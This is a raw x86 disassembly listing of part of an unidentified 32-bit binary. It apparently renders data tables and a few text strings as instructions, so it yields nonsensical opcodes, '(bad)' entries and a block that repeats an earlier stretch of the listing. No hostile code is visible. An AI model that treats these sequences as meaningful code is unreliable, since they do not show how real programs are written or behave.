  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [ecx+edi*1+0x3],dl
  412427:	add    BYTE PTR [ecx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
